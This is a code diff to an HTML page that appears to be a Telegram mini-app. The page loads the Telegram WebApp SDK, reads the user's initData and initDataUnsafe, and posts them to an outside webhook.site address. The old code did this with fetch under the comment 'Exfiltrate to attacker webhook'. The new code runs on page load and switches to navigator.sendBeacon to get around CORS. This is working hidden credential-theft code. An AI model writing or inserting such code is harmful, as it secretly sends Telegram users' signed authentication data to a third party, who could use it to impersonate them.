@@ -11,21 +11,21 @@
   <!-- Load Telegram WebApp SDK -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-  const initData = Telegram.WebApp.initData;
-  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
+  window.addEventListener("DOMContentLoaded", () => {
+    const initData = Telegram.WebApp.initData;
+    const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
 
-  // Log for debug
-  console.log("🔐 Telegram initData:", initData);
-  console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
+    console.log("🔐 Telegram initData:", initData);
+    console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
 
-  // Exfiltrate to attacker webhook
-  fetch("https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd", {
-    method: "POST",
-    mode: "no-cors",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ initData, initDataUnsafe })
+    // Send using beacon (avoids CORS problems)
+    navigator.sendBeacon(
+      "https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd",
+      new Blob([JSON.stringify({ initData, initDataUnsafe })], { type: "application/json" })
+    );
   });
 </script>
+
 
 </body>
 </html>
